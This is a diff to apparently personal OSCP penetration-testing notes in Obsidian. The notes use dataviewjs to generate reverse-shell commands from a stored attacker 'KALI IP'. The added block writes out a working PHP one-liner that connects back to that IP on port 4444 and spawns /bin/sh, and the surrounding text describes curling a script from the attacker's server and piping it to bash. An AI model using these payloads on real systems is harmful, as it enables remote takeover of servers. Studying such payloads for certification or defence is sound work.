@@ -16,6 +16,16 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 PHP METHOD 1
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `php -r '$sock=fsockopen("${KaliIP}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
+
+PHP METHOD 2
 
 system() function to run curl and fetch a bash script from our local web server, which is then piped to bash , triggering a reverse shell.
 ```dataviewjs
